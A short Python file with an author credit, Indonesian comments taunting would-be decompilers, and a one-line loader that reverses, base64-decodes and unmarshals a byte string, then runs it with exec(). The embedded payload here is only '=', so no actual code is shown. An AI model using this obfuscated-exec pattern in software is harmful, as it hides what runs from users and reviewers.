# AUTHOR : AMELIA CYBER

# https://www.github.com/AMELIA-404-CYBER

# apa liat liat file ini mau di dec ya

#izin dulu mau dec file ini

# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))